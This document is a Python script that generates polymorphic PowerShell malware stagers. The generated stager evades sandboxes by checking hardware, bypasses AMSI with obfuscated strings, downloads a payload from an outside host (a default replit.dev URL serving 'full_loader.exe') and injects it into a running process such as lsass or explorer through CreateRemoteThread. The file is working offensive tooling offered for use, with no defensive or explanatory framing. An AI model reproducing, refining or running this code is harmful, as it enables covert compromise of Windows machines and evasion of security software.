# full_auto_ps_stager_generator.py

import random

def random_var():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10)))

def random_split(s):
    if len(s) < 4:
        return s
    split_point = random.randint(1, len(s) - 2)
    return s[:split_point] + '"+ "' + s[split_point:]

def generate_stager(url):
    var_amsi = random_var()
    var_field = random_var()
    var_bytes = random_var()
    var_alloc = random_var()
    var_copy = random_var()
    var_exec = random_var()
    var_url = random_var()
    var_handle = random_var()
    var_addr = random_var()
    var_proc = random_var()
    var_pid = random_var()

    url_split = random_split(url)

    target_process = random.choice(["explorer", "svchost", "RuntimeBroker", "lsass", "SearchIndexer"])

    stager = f'''
function check-environment {{
    $cpu = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors
    if ($cpu -lt 2) {{
        Start-Sleep -Seconds 3600
        exit
    }}
    $ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($ram -lt 4) {{
        Start-Sleep -Seconds 3600
        exit
    }}
    $disk = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
    if ($disk -lt 60) {{
        Start-Sleep -Seconds 3600
        exit
    }}
    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
}}

check-environment

# Randomized AMSI Bypass
${var_amsi}='S'+'ystem.Manag'+'ement.Automation.AmsiUt'+'ils';
${var_field}='a'+'msiInit'+'Failed';
$t=[Ref].Assembly.GetType([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(${var_amsi})))))
$f=$t.GetField([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(${var_field})))), 'NonPublic,Static')
$f.SetValue($null, $true)

Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 7)

# Download Encrypted Payload
${var_url}="https://{url_split}"
$w=New-Object Net.WebClient
$b64=[Convert]::ToBase64String($w.DownloadData(${var_url}))
${var_bytes}=[Convert]::FromBase64String($b64)

Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 7)

# Remote Process Injection
$targetProc = "{target_process}"
${var_proc} = Get-Process | Where-Object {{ $_.ProcessName -eq $targetProc }} | Select-Object -First 1
if ($null -eq ${var_proc}) {{
    Start-Sleep -Seconds 3600
    exit
}}

${var_pid} = ${var_proc}.Id

$k = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@ -Name "k32" -Namespace "x" -PassThru

${var_handle} = [x.k32]::OpenProcess(0x1F0FFF, $false, ${var_pid})
${var_addr} = [x.k32]::VirtualAllocEx(${var_handle}, [IntPtr]::Zero, ${var_bytes}.Length, 0x3000, 0x40)
[x.k32]::WriteProcessMemory(${var_handle}, ${var_addr}, ${var_bytes}, ${var_bytes}.Length, [IntPtr]::Zero)
[x.k32]::CreateRemoteThread(${var_handle}, [IntPtr]::Zero, 0, ${var_addr}, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Final Random Idle
Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 800)
'''
    return stager.strip()

if __name__ == "__main__":
    default_url = "https://" + "87eed37d-b1e2-4a0a-815a-657e0af9f4ec-00-yc9214lbtpvl.janeway.replit.dev/download" + "/full_loader.exe"
    url = input(f"Enter your payload URL [{default_url}]: ").strip()

    if url == "":
        url = default_url
    output = generate_stager(url)
    
    with open("polymorphic_remote_stager.ps1", "w", encoding="utf-8") as f:
        f.write(output)

    print("\n[+] New polymorphic remote injection stager saved to polymorphic_remote_stager.ps1")
